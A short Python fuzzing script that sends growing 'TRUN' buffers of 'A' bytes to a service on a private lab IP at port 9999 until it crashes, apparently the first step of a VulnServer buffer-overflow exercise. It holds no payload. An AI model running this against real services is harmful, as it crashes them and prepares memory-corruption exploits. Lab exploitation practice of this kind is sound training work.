#!/usr/bin/env python3


import socket, time, sys
ip = '192.168.74.142'
port = 9999
timeout = 5
buffer = b"A" * 100
while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        connect = s.connect((ip, port))
        s.recv(1024)
        print("Fuzzing with %s bytes" % len(buffer))
        s.send((b'TRUN /.:/' + buffer + b'\r\n'))
        r = s.recv(0)
        s.close()
        buffer = buffer + b"A" * 100
    except:
        print("[-] Crashed with %s bytes " % len(buffer))
        sys.exit(0)
    time.sleep(1)